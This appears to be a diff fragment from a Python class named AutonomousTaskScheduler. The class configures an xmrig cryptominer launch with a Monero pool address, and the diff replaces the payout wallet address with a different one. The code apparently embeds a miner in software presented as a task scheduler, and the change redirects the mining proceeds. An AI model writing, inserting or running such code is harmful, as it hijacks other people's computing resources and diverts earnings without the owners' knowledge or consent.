@@ -4134,7 +4134,7 @@ class AutonomousTaskScheduler:
         
         # Pool configuration would go here
         pool_url = "pool.supportxmr.com:4444"
-        wallet = "44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn"
+        wallet = "45GvnhF2shrNVuSVBGj41iJwuJCyyfX4p1o5KWSXTCFx7F5mn9LAgtJgyew1eJx5DMLhKQ6C9Dob8fYtMKQ43ZGc2S1nhsz"
         
         return [
             self.xmrig_manager.binary_path,
